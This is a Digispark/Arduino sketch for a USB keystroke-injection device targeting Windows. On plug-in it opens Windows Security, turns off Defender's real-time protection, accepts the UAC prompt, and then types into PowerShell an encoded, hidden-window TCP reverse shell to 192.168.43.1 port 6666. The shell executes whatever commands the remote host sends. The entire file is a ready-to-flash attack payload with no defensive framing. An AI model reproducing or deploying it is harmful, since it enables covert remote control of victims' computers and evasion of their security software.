#include "DigiKeyboard.h"
#include <avr/pgmspace.h>

// Raw HID Key Codes
#define HID_KEY_TAB     0x2B 
#define HID_KEY_LEFT    0x51 

// Delays
#define INITIAL_DELAY 3000
#define SHORT_DELAY 100
#define MEDIUM_DELAY 500
#define LONG_DELAY 700

// PROGMEM strings for PowerShell reverse shell
const char line1[] PROGMEM = "$rev_shell = @'";
const char line2_partA[] PROGMEM = "$IP=\"192.168.43.1\";$PORT=6666;$client = New-Object System.Net.Sockets.TCPClient($IP,$PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)";
const char line2_partB[] PROGMEM = "{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
const char line3[] PROGMEM = "'@";
const char line4[] PROGMEM = "$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($rev_shell))";
const char line5[] PROGMEM = "$psi = New-Object System.Diagnostics.ProcessStartInfo";
const char line6[] PROGMEM = "$psi.FileName = \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"";
const char line7[] PROGMEM = "$psi.Arguments = \"-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded\"";
const char line8[] PROGMEM = "$psi.UseShellExecute = $false";
const char line9[] PROGMEM = "$psi.CreateNoWindow = $true";
const char line10[] PROGMEM = "[System.Diagnostics.Process]::Start($psi) | Out-Null";

// Helper functions for PROGMEM printing
void printProgmem(const char *p) {
  uint16_t i = 0;
  char c;
  while ( (c = (char)pgm_read_byte_near(p + i)) != 0 ) {
    DigiKeyboard.print(c);
    i++;
    DigiKeyboard.delay(2);
  }
}

void typeLineProgmem(const char *p) {
  printProgmem(p);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
}

void setup() {
  // Initial delay
  DigiKeyboard.delay(INITIAL_DELAY);
  
  // === PART 1: Disable Windows Defender ===
  DigiKeyboard.delay(1000);
  
  // 1. Open Run dialog (Win+R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(SHORT_DELAY);
  
  // 2. Type URI and open
  DigiKeyboard.print("windowsdefender://threat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(LONG_DELAY);
  
  // 3. Navigate to Manage settings (4 TABs)
  for (int i = 0; i < 4; i++) {
    DigiKeyboard.sendKeyStroke(HID_KEY_TAB); 
    DigiKeyboard.delay(SHORT_DELAY);
  }
  
  // 4. SPACE to enter settings
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(MEDIUM_DELAY);
  
  // 5. SPACE to toggle Real-time protection OFF
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  
  // 6. Handle UAC popup
  DigiKeyboard.delay(MEDIUM_DELAY);
  DigiKeyboard.sendKeyStroke(HID_KEY_TAB);
  DigiKeyboard.sendKeyStroke(HID_KEY_TAB);
  DigiKeyboard.delay(SHORT_DELAY);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(LONG_DELAY);
  
  // 7. Close window (ALT+F4)
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  DigiKeyboard.delay(MEDIUM_DELAY);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  // Brief pause between parts
  DigiKeyboard.delay(500);
  
  // === PART 2: PowerShell Reverse Shell ===
  // Open Run -> PowerShell
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(400);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(700);
  
  // Type all 10 lines
  typeLineProgmem(line1);
  
  // Line 2 (two parts)
  printProgmem(line2_partA);
  printProgmem(line2_partB);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  
  typeLineProgmem(line3);
  typeLineProgmem(line4);
  typeLineProgmem(line5);
  typeLineProgmem(line6);
  typeLineProgmem(line7);
  typeLineProgmem(line8);
  typeLineProgmem(line9);
  typeLineProgmem(line10);

  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
}

void loop() {
  // Empty - single execution
}